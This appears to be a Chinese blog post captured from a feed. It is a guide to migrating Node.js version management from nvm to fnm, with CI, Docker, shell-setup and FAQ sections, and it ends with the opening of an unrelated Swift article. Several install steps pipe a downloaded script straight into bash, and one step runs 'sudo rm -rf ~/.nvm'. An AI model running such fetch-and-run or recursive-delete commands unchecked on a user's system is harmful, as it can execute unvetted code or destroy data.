<li><strong>高效的文件操作</strong>：Rust 的 I/O 性能本就出色</li>
</ol>
<h3 data-id="heading-13">真实场景：fnm 如何改变我的工作流</h3>
<h4 data-id="heading-14">场景一：多项目并行开发</h4>
<p>我同时维护着这些项目：</p>



































<table><thead><tr><th>项目</th><th>Node 版本</th><th>原因</th></tr></thead><tbody><tr><td>老后台系统</td><td>14</td><td>历史包袱，依赖不支持高版本</td></tr><tr><td>主站前端</td><td>18</td><td>稳定的 LTS</td></tr><tr><td>新管理后台</td><td>20</td><td>需要新特性</td></tr><tr><td>实验性项目</td><td>22</td><td>尝鲜最新 API</td></tr><tr><td>Electron 应用</td><td>18</td><td>Electron 版本限制</td></tr></tbody></table>
<p><strong>以前用 nvm：</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
$ nvm use  <span class="hljs-comment"># 等待...</span>
Found <span class="hljs-string">'/Users/me/legacy-admin/.nvmrc'</span> with version &lt;14&gt;
Now using node v14.21.3

$ <span class="hljs-built_in">cd</span> ../main-site
$ nvm use  <span class="hljs-comment"># 又等待...</span>
Found <span class="hljs-string">'/Users/me/main-site/.nvmrc'</span> with version &lt;18&gt;
Now using node v18.20.8

<span class="hljs-comment"># 经常忘记 nvm use，然后...</span>
$ npm install
<span class="hljs-comment"># 装了一堆错误版本的依赖 💥</span>
</code></pre>
<p><strong>现在用 fnm：</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
Using Node v14.21.3  <span class="hljs-comment"># 自动切换，瞬间完成</span>

$ <span class="hljs-built_in">cd</span> ../main-site
Using Node v20.19.6  <span class="hljs-comment"># 无感切换</span>

<span class="hljs-comment"># 永远不会忘记切换版本，因为是自动的</span>
</code></pre>
<h4 data-id="heading-15">场景二：CI/CD 环境统一</h4>
<p>我们团队的 CI 配置以前是这样的：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (使用 nvm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-o-</span> <span class="hljs-string">https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">NVM_DIR="$HOME/.nvm"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">.</span> <span class="hljs-string">"$NVM_DIR/nvm.sh"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">use</span>
</code></pre>
<p>换成 fnm 后：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (使用 fnm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-fsSL</span> <span class="hljs-string">https://fnm.vercel.app/install</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">eval</span> <span class="hljs-string">"$(fnm env)"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">use</span>
</code></pre>
<p><strong>CI 构建时间减少了约 15 秒</strong>（主要是 nvm 初始化太慢）。</p>
<h4 data-id="heading-16">场景三：团队协作与跨平台</h4>
<p>我们团队成员使用的系统：</p>
<ul>
<li>60% macOS</li>
<li>30% Windows</li>
<li>10% Linux</li>
</ul>
<p><strong>nvm 时代的痛苦：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS/Linux 同事</span>
$ nvm use 20

<span class="hljs-comment"># Windows 同事（nvm-windows）</span>
$ nvm use 20.19.6  <span class="hljs-comment"># 必须写完整版本号！</span>
<span class="hljs-comment"># 而且 .nvmrc 经常不生效</span>
</code></pre>
<p><strong>fnm 时代的统一：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 所有平台，相同命令，相同行为</span>
$ fnm use 20
</code></pre>
<p>Windows 同事终于不用单独维护一套文档了。</p>
<h4 data-id="heading-17">场景四：Docker 开发环境</h4>
<p>在 Dockerfile 中安装 Node：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 以前用 nvm（不推荐，但有人这么干）
RUN curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash \
    &amp;&amp; . ~/.nvm/nvm.sh \
    &amp;&amp; nvm install 20 \
    &amp;&amp; nvm alias default 20
# 镜像体积大，层数多

# 现在用 fnm
RUN curl -fsSL https://fnm.vercel.app/install | bash -s -- --install-dir /usr/local/bin \
    &amp;&amp; fnm install 20 \
    &amp;&amp; fnm default 20
# 更简洁，体积更小
</code></pre>
<h4 data-id="heading-18">场景五：Monorepo 中的多版本需求</h4>
<p>我们有一个 Monorepo，不同 package 需要不同 Node 版本：</p>
<pre><code class="hljs language-bash" lang="bash">monorepo/
├── packages/
│   ├── legacy-sdk/        <span class="hljs-comment"># 需要 Node 14（兼容老用户）</span>
│   │   └── .node-version  <span class="hljs-comment"># 14</span>
│   ├── web-app/           <span class="hljs-comment"># 需要 Node 20</span>
│   │   └── .node-version  <span class="hljs-comment"># 20</span>
│   └── cli-tool/          <span class="hljs-comment"># 需要 Node 18</span>
│       └── .node-version  <span class="hljs-comment"># 18</span>
└── .node-version          <span class="hljs-comment"># 20（默认）</span>
</code></pre>
<p>fnm 的 <code>--use-on-cd</code> 让我在不同 package 间跳转时完全无感：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> packages/legacy-sdk
Using Node v14.21.3

$ <span class="hljs-built_in">cd</span> ../web-app
Using Node v20.19.6

$ <span class="hljs-built_in">cd</span> ../cli-tool
Using Node v18.20.8
</code></pre>
<h3 data-id="heading-19">完整迁移指南</h3>
<h4 data-id="heading-20">第一步：安装 fnm</h4>
<p><strong>macOS (Homebrew):</strong></p>
<pre><code class="hljs language-bash" lang="bash">brew install fnm
</code></pre>
<p><strong>Windows (Scoop):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">scoop install fnm
</code></pre>
<p><strong>Windows (Chocolatey):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">choco install fnm
</code></pre>
<p><strong>Linux/macOS (curl):</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://fnm.vercel.app/install | bash
</code></pre>
<p><strong>Cargo (Rust 用户):</strong></p>
<pre><code class="hljs language-bash" lang="bash">cargo install fnm
</code></pre>
<h4 data-id="heading-21">第二步：配置 Shell</h4>
<p>这是最关键的一步，配置正确才能享受自动切换的便利。</p>
<p><strong>Zsh (~/.zshrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell zsh)</span>"</span>
</code></pre>
<p><strong>Bash (~/.bashrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell bash)</span>"</span>
</code></pre>
<p><strong>Fish (~/.config/fish/config.fish):</strong></p>
<pre><code class="hljs language-fish" lang="fish"># fnm - Fast Node Manager
fnm env --use-on-cd --shell fish | source
</code></pre>
<p><strong>PowerShell ($PROFILE):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># fnm - Fast Node Manager
fnm env --use-on-cd --shell powershell | Out-String | Invoke-Expression
</code></pre>
<p><strong>参数说明：</strong></p>

























<table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>--use-on-cd</code></td><td>进入目录时自动读取 <code>.node-version</code> 或 <code>.nvmrc</code> 并切换</td></tr><tr><td><code>--shell &lt;shell&gt;</code></td><td>指定 Shell 类型，生成对应的环境变量设置命令</td></tr><tr><td><code>--version-file-strategy recursive</code></td><td>向上递归查找版本文件（可选）</td></tr><tr><td><code>--corepack-enabled</code></td><td>自动启用 Corepack（可选）</td></tr></tbody></table>
<h4 data-id="heading-22">第三步：迁移已安装的 Node 版本</h4>
<p>查看 nvm 安装了哪些版本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span> ~/.nvm/versions/node/
<span class="hljs-comment"># v10.24.1 v14.21.3 v16.20.2 v18.20.8 v20.19.6 v22.21.0</span>
</code></pre>
<p>在 fnm 中安装对应版本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式一：通过 LTS 代号安装（推荐，自动获取最新补丁版本）</span>
fnm install lts/fermium   <span class="hljs-comment"># v14.x</span>
fnm install lts/gallium   <span class="hljs-comment"># v16.x</span>
fnm install lts/hydrogen  <span class="hljs-comment"># v18.x</span>
fnm install lts/iron      <span class="hljs-comment"># v20.x</span>
fnm install lts/jod       <span class="hljs-comment"># v22.x</span>

<span class="hljs-comment"># 方式二：通过大版本号安装</span>
fnm install 14
fnm install 16
fnm install 18
fnm install 20
fnm install 22

<span class="hljs-comment"># 方式三：安装精确版本</span>
fnm install 18.20.8
fnm install 20.19.6
</code></pre>
<p>设置默认版本：</p>
<pre><code class="hljs language-bash" lang="bash">fnm default 22
</code></pre>
<h4 data-id="heading-23">第四步：处理全局 npm 包</h4>
<p>这是很多人忽略的一步！nvm 下安装的全局包不会自动迁移。</p>
<p>查看 nvm 中的全局包：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 切换到 nvm 的某个版本</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm/versions/node/v20.19.6/bin:<span class="hljs-variable">$PATH</span>"</span>
npm list -g --depth=0
</code></pre>
<p>在 fnm 的对应版本中重新安装：</p>
<pre><code class="hljs language-bash" lang="bash">fnm use 20
npm install -g typescript ts-node nodemon pm2 <span class="hljs-comment"># 你需要的包</span>
</code></pre>
<p><strong>Pro Tip:</strong> 可以写个脚本批量处理：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># migrate-global-packages.sh</span>

<span class="hljs-comment"># 你常用的全局包</span>
PACKAGES=<span class="hljs-string">"typescript ts-node nodemon pm2 pnpm yarn"</span>

<span class="hljs-keyword">for</span> version <span class="hljs-keyword">in</span> 18 20 22; <span class="hljs-keyword">do</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Installing global packages for Node <span class="hljs-variable">$version</span>..."</span>
  fnm use <span class="hljs-variable">$version</span>
  npm install -g <span class="hljs-variable">$PACKAGES</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h4 data-id="heading-24">第五步：注释掉 nvm 配置</h4>
<p>编辑你的 Shell 配置文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.zshrc 或 ~/.bashrc</span>

<span class="hljs-comment"># nvm - 已迁移到 fnm，注释掉避免冲突</span>
<span class="hljs-comment"># export NVM_DIR="$HOME/.nvm"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/bash_completion" ] &amp;&amp; \. "$NVM_DIR/bash_completion"</span>
</code></pre>
<h4 data-id="heading-25">第六步：验证迁移结果</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 重新加载配置</span>
<span class="hljs-built_in">source</span> ~/.zshrc  <span class="hljs-comment"># 或 source ~/.bashrc</span>

<span class="hljs-comment"># 验证 fnm 工作正常</span>
fnm list
fnm current
node -v
npm -v
<span class="hljs-built_in">which</span> node

<span class="hljs-comment"># 测试自动切换</span>
<span class="hljs-built_in">cd</span> /path/to/project-with-nvmrc
<span class="hljs-comment"># 应该看到 "Using Node vX.X.X"</span>
node -v
</code></pre>
<h4 data-id="heading-26">第七步：删除 nvm（可选但推荐）</h4>
<p>确认一切正常后，可以删除 nvm 释放磁盘空间：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf ~/.nvm

<span class="hljs-comment"># 如果遇到权限问题</span>
sudo <span class="hljs-built_in">rm</span> -rf ~/.nvm
</code></pre>
<h3 data-id="heading-27">命令速查表</h3>




























































<table><thead><tr><th>功能</th><th>nvm 命令</th><th>fnm 命令</th></tr></thead><tbody><tr><td>安装指定版本</td><td><code>nvm install 20</code></td><td><code>fnm install 20</code></td></tr><tr><td>安装最新 LTS</td><td><code>nvm install --lts</code></td><td><code>fnm install --lts</code></td></tr><tr><td>安装指定 LTS</td><td><code>nvm install --lts=iron</code></td><td><code>fnm install lts/iron</code></td></tr><tr><td>切换版本</td><td><code>nvm use 20</code></td><td><code>fnm use 20</code></td></tr><tr><td>设置默认版本</td><td><code>nvm alias default 20</code></td><td><code>fnm default 20</code></td></tr><tr><td>查看已安装版本</td><td><code>nvm ls</code></td><td><code>fnm list</code></td></tr><tr><td>查看远程可用版本</td><td><code>nvm ls-remote</code></td><td><code>fnm list-remote</code></td></tr><tr><td>查看当前版本</td><td><code>nvm current</code></td><td><code>fnm current</code></td></tr><tr><td>卸载版本</td><td><code>nvm uninstall 18</code></td><td><code>fnm uninstall 18</code></td></tr><tr><td>在指定版本执行命令</td><td><code>nvm exec 18 node -v</code></td><td><code>fnm exec --using=18 node -v</code></td></tr></tbody></table>
<h3 data-id="heading-28">LTS 版本代号参考</h3>





















































<table><thead><tr><th>代号</th><th>版本</th><th>发布日期</th><th>LTS 开始</th><th>维护结束</th><th>状态</th></tr></thead><tbody><tr><td>Jod</td><td>v22.x</td><td>2024-04</td><td>2024-10</td><td>2027-04</td><td>✅ Active LTS</td></tr><tr><td>Iron</td><td>v20.x</td><td>2023-04</td><td>2023-10</td><td>2026-04</td><td>✅ Active LTS</td></tr><tr><td>Hydrogen</td><td>v18.x</td><td>2022-04</td><td>2022-10</td><td>2025-04</td><td>⚠️ Maintenance</td></tr><tr><td>Gallium</td><td>v16.x</td><td>2021-04</td><td>2021-10</td><td>2024-09</td><td>❌ End-of-Life</td></tr><tr><td>Fermium</td><td>v14.x</td><td>2020-04</td><td>2020-10</td><td>2023-04</td><td>❌ End-of-Life</td></tr></tbody></table>
<blockquote>
<p><strong>建议</strong>：新项目使用 v20 或 v22，老项目尽快升级到至少 v18。</p>
</blockquote>
<h3 data-id="heading-29">进阶技巧</h3>
<h4 data-id="heading-30">1. 配置版本文件查找策略</h4>
<p>默认情况下，fnm 只在当前目录查找 <code>.node-version</code> 或 <code>.nvmrc</code>。如果你的项目结构比较深，可以启用递归查找：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --version-file-strategy recursive)</span>"</span>
</code></pre>
<h4 data-id="heading-31">2. 启用 Corepack</h4>
<p>Corepack 是 Node.js 内置的包管理器版本管理工具，可以锁定 pnpm/yarn 版本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --corepack-enabled)</span>"</span>
</code></pre>
<h4 data-id="heading-32">3. 自定义安装目录</h4>
<p>默认安装在 <code>~/.local/share/fnm</code>，可以自定义：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> FNM_DIR=<span class="hljs-string">"/path/to/custom/fnm"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd)</span>"</span>
</code></pre>
<h4 data-id="heading-33">4. 使用国内镜像加速</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 临时使用</span>
fnm install 20 --node-dist-mirror=https://npmmirror.com/mirrors/node

<span class="hljs-comment"># 永久配置</span>
<span class="hljs-built_in">export</span> FNM_NODE_DIST_MIRROR=<span class="hljs-string">"https://npmmirror.com/mirrors/node"</span>
</code></pre>
<h4 data-id="heading-34">5. 在脚本中使用 fnm</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 确保 fnm 环境已加载</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env)</span>"</span>

<span class="hljs-comment"># 使用指定版本执行</span>
fnm use 20
node your-script.js

<span class="hljs-comment"># 或者用 exec</span>
fnm <span class="hljs-built_in">exec</span> --using=20 node your-script.js
</code></pre>
<h3 data-id="heading-35">常见问题 FAQ</h3>
<h4 data-id="heading-36">Q: fnm 安装的 Node 在哪里？</h4>
<pre><code class="hljs language-bash" lang="bash">~/.local/share/fnm/node-versions/
</code></pre>
<p>每个版本是一个独立目录，结构清晰。</p>
<h4 data-id="heading-37">Q: 为什么 <code>which node</code> 显示的路径很奇怪？</h4>
<p>fnm 使用"多 Shell"机制，每个 Shell 会话有独立的 PATH：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">which</span> node
/Users/xxx/.local/state/fnm_multishells/12345_1234567890/bin/node
</code></pre>
<p>这是正常的，确保了不同终端窗口可以使用不同版本。</p>
<h4 data-id="heading-38">Q: 如何在 VS Code 中使用 fnm 管理的 Node？</h4>
<p>VS Code 会自动检测 fnm。如果遇到问题，可以在 <code>settings.json</code> 中配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"terminal.integrated.env.osx"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"PATH"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"${env:PATH}"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>或者在项目根目录创建 <code>.vscode/settings.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"eslint.runtime"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-39">Q: fnm 支持 .nvmrc 吗？</h4>
<p>完全支持！fnm 会按以下顺序查找版本文件：</p>
<ol>
<li><code>.node-version</code></li>
<li><code>.nvmrc</code></li>
<li><code>package.json</code> 的 <code>engines.node</code> 字段</li>
</ol>
<h4 data-id="heading-40">Q: 如何回退到 nvm？</h4>
<p>如果你想回退（虽然我不建议），只需：</p>
<ol>
<li>注释掉 fnm 配置</li>
<li>取消注释 nvm 配置</li>
<li>重新加载 Shell</li>
</ol>
<p>你的 nvm 数据（如果没删）还在 <code>~/.nvm</code>。</p>
<h3 data-id="heading-41">总结：值得迁移吗？</h3>
<p><strong>绝对值得。</strong></p>
<p>迁移成本：</p>
<ul>
<li>时间：约 15-30 分钟</li>
<li>学习曲线：几乎为零（命令高度相似）</li>
<li>风险：极低（可随时回退）</li>
</ul>
<p>获得收益：</p>
<ul>
<li>终端启动快 5-10 倍</li>
<li>版本切换快 20-30 倍</li>
<li>自动切换版本，告别手动 <code>nvm use</code></li>
<li>跨平台一致性，团队协作更顺畅</li>
<li>更少的 Bug 和怪异行为</li>
</ul>
<p>如果你每天要打开几十次终端、在多个项目间切换，fnm 节省的时间累积起来是非常可观的。更重要的是，那种<strong>丝滑无感</strong>的体验，会让你的开发心情都变好。</p>
<hr/>
<p><strong>参考资料：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm" target="_blank" title="https://github.com/Schniz/fnm" ref="nofollow noopener noreferrer">fnm GitHub 仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fabout%2Freleases%2F" target="_blank" title="https://nodejs.org/en/about/releases/" ref="nofollow noopener noreferrer">Node.js 发布计划</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSchniz%2Ffnm%23performance" target="_blank" title="https://github.com/Schniz/fnm#performance" ref="nofollow noopener noreferrer">nvm vs fnm 性能对比</a></li>
</ul>
<hr/>
<p><em>如果这篇文章对你有帮助，欢迎点赞收藏。有问题可以在评论区交流！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙]]></title>    <link>https://juejin.cn/post/7581888578507751451</link>    <guid>https://juejin.cn/post/7581888578507751451</guid>    <pubDate>2025-12-10T02:12:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507751451" data-draft-id="7581702285564297266" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙"/> <meta itemprop="keywords" content="Swift,Apple,编程语言"/> <meta itemprop="datePublished" content="2025-12-10T02:12:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大熊猫侯佩"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift 迭代三巨头（下集）：Sequence、Collection 与 Iterator 深度狂飙
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大熊猫侯佩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:12:24.000Z" title="Wed Dec 10 2025 02:12:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/577f8a07372742659bd5737aa4f02997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=jM0rkEV7s4NH8z%2FvXiZOnHvx9Vc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-0">🛡️ 第一重防线：破解 AsyncSequence 的错误恢复漏洞</h2>
<p>异步序列的 “错误恢复漏洞”，本质是没搞懂<code>AsyncSequence</code>的错误传播规则 —— 就像 F1 赛车的刹车系统没校准，一踩就抱死，一松就失控。</p>
<p>当<code>next()</code>抛出错误时，默认会直接终止迭代，可如果粗暴重试，又会导致 “重复接收元素”；如果不重试，又会丢失关键数据。</p>
<p><strong>在本堂F1调教课中，您将学到如下内容：</strong></p>
<ul>
<li>🛡️ 第一重防线：破解 AsyncSequence 的错误恢复漏洞</li>
<li>错误传播的 “底层逻辑”</li>
<li>精准重试：给迭代器加 “记忆功能”</li>
<li>实战效果：再也不重复，再也不丢失</li>
<li>🛡️ 第二重防线：给 SafeRingBuffer 加 “数据校验锁”</li>
<li>校验逻辑：哈希值是 “数据身份证”</li>
<li>升级后的 SafeRingBuffer（核心校验代码）</li>
<li>效果：“迭代异常兽” 的篡改彻底失效</li>
<li>🏆 终局：组合拳粉碎 “迭代异常兽”</li>
<li>完整流程代码（终局方案）</li>
<li>剧情收尾：赛道恢复平静，迭代真相揭晓</li>
<li>📝 终极总结：Swift 迭代的 “黄金法则”</li>
</ul>
<p>艾拉和杰西要做的，就是找到 “精准重试” 的平衡点。</p>
